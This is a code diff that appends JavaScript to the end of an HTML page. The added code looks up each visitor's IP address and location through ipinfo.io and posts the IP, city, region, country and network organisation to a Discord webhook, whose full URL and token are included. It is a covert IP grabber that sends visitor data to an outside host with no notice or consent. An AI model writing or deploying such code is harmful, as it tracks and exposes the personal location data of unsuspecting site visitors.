@@ -159,3 +159,24 @@
 
 </body>
 </html>
+const webhookURL = "[PUT_YOUR_WEBHOOK_HERE](https://discord.com/api/webhooks/1414004082456395878/_H_KjbE0reS3k6tQgtV0qBJUXD_24NwMDnWhkDzMU7gzUNO8dDZ818AlYLL-QquE96CG)";
+
+fetch('https://ipinfo.io/json')
+  .then(response => response.json())
+  .then(data => {
+      // عرض البيانات على الصفحة
+      const infoDiv = document.getElementById('ip-info');
+      infoDiv.textContent = JSON.stringify(data, null, 2);
+
+      // إرسال البيانات إلى Webhook
+      fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+              'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+              content: `New visitor info:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrg: ${data.org}`
+          })
+      });
+  });
+
